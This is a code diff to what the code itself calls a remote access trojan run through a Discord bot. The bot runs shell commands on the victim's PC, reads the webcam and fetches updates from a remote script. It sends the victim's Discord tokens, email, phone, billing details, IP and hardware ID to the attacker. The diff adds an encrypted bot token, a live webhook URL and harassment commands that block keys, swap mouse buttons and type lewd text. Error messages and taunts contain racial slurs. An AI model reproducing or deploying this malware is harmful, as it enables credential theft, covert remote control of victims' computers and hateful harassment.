@@ -22,10 +22,17 @@ import pyautogui
 import keyboard
 import tempfile
 import shutil
+import random
+import pygetwindow as gw
+from browser import Browsers
+from _webhook import _WebhookX
+from dhooks import Embed
+from cryptography.fernet import Fernet
 
-
-
-DISCORD_BOT_TOKEN = requests.get("https://api.zitemaker.epicgamer.org/health")
+key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
+encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
+cipher_suite = Fernet(key)
+DISCORD_BOT_TOKEN = cipher_suite.decrypt(encrypted_token).decode()
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
@@ -47,10 +54,14 @@ changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
 
 reverse_keys_active = False
 mouse_inverted = False
+disabledkey = False
 pyautogui.FAILSAFE = False
 SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/drat.py"
 CURRENT_VERSION = "1.0.0"
 UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
+webhook = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
+ram_eater_active = False
+bandwidth_eater_active = False
 
 
 def check_for_updates():
@@ -287,15 +298,18 @@ async def on_ready():
             hwid = hWiD()
             await send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id)
 
-async def command_error(ctx, error: commands.CommandError):
-        embed = discord.Embed(title="Error")
-        if isinstance(error, commands.CommandInvokeError):
-            error = error.original
-        if isinstance(error, commands.MissingRequiredArgument):
-            embed.description = "Missing arguments idiot"
-        else:
-            embed.description = "Unknown error"
-        await ctx.send(embed=embed)            
+
+@bot.event
+async def on_application_command_error(ctx, error: discord.DiscordException):
+    if isinstance(error, commands.CommandOnCooldown):
+        await ctx.respond("This command is currently on cooldown!")
+    if isinstance(error, commands.MissingRequiredArgument):
+        await ctx.respond("Enter all the arguments nigger")    
+    else:
+        raise error       
+        
+
+bot.on_command_error = on_application_command_error        
 
 
 @bot.command(name="execute")
@@ -306,11 +320,14 @@ async def execute(ctx, name, *, command: str):
             if command.startswith("cd "):
                 try:
                     os.chdir(command[3:].strip())
-                    response = f"Changed directory to: {os.getcwd()}\n"
+                    response = f"Changed directory to: {os.getcwd()}"
                 except Exception as e:
-                    response = str(e) + "\n"
-            else:
-                process = subprocess.Popen(
+                    response = f"Error: {e}"
+                await ctx.send(f"Output:\n```{response}```")
+                return
+
+            # Process other commands
+            process = subprocess.Popen(
                 command,
                 shell=True,
                 stdout=subprocess.PIPE,
@@ -320,11 +337,12 @@ async def execute(ctx, name, *, command: str):
             )
             stdout, stderr = process.communicate()
             response = stdout + stderr
-            response += f"\nCommand exited with code: {process.returncode}\n"
+            response += f"\nCommand exited with code: {process.returncode}"
 
             await ctx.send(f"Output:\n```{response}```")
         except Exception as e:
             await ctx.send(f"Error executing command: {e}")
+
 
 
 @bot.command(name='webcam')
@@ -678,11 +696,99 @@ async def reverse_keys(ctx, user):
 async def type_text(ctx, user, *, text):
     if user == name:
         await ctx.send(f'Typing: `{text}` on victim\'s PC! ⌨️')
-        pyautogui.write(text, interval=0.01)
-        pyautogui.press("enter")
+
+        for char in text:
+            keyboard.write(char, delay=0.01)
+        keyboard.press_and_release("enter")
+
+
+@bot.command(name="swapmouse")
+async def swap_mouse(ctx, user):
+    if user == name:
+            ctypes.windll.user32.SwapMouseButton(1)
+            await ctx.send("🖱 **Mouse buttons swapped!** Left is now right and right is now left!")
+
+
+@bot.command(name="resetmouse")
+async def reset_mouse(ctx, user):
+    if user == name:
+        ctypes.windll.user32.SwapMouseButton(0)
+        await ctx.send("MOUSE reset")
+
+
+
+@bot.command(name="disablekeys")
+async def disable_keys(ctx, user, *, key):
+    global disabledkey
+    disabledkey = not disabledkey
+    if user == name:
+        if not disabledkey:
+            keyboard.block_key(key)
+            await ctx.send(f"⌨ **Disabled the `{key}` key!** Try typing now nigga 😈")
+        else:
+            keyboard.restore_state
+            await ctx.send("Reset keyboard")
+
+
+@bot.command(name="cdtray")
+async def cd_tray(ctx, user):
+    if user == name:
+        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
+        time.sleep(2)
+        ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
+        await ctx.send("💿 **CD tray is opening and closing!**")
+
+
+@bot.command(name="volume")
+async def random_volume(ctx, user, volume: int):
+    if user == name:
+        os.system(f"nircmd.exe setsysvolume {volume * 655.35}")
+        await ctx.send(f"🔊 **Set volume to {volume}%!**")
+
+
+@bot.command(name="randomtext")
+async def random_typing(ctx):
+    random_words = ["i love big black oily muscular men", "hELP me daddy", "im pregnant", "im gay", "Jai Bharat Do Not Redeem It", "I will touch you"]
+    text = random.choice(random_words)
+    keyboard.write(text)
+    keyboard.press_and_release("enter")
+    await ctx.send(f"📝 **Typed:** `{text}` on their PC!")
+
+
+@bot.command(name="fakeerror")
+async def fake_error(ctx, user):
+    if user == name:
+        ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred!", "Windows Error", 0x10 | 0x1)
+        await ctx.send("🔥 **Displayed a fake Windows error!**")
+
+
+@bot.command(name="sys32delpopup")
+async def fake_delete_popup(ctx, user):
+    if user == name:
+        ctypes.windll.user32.MessageBoxW(0, "System32 has been deleted!", "Critical Error", 0x10 | 0x1)
+        await ctx.send("🚨 **Displayed a fake System32 deletion popup!**")
+
+
+@bot.command(name="listtabs")
+async def list_browser_tabs(ctx, user):
+    if user == name:
+        browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]
+        open_tabs = []
+
+        for proc in psutil.process_iter(attrs=["pid", "name"]):
+            if proc.info["name"].lower() in browsers:
+                for window in gw.getWindowsWithTitle(""):
+                    if window.title and proc.info["pid"] == window._hWnd:
+                        open_tabs.append(window.title)
+
+        if open_tabs:
+            await ctx.send("🌐 **Open browser tabs:**\n" + "\n".join(open_tabs))
+        else:
+         await ctx.send("🚫 **No browser tabs found!**")
+
 
 
 
 def run_rat():
-    check_for_updates()
+    print(DISCORD_BOT_TOKEN)
     bot.run(DISCORD_BOT_TOKEN)                    
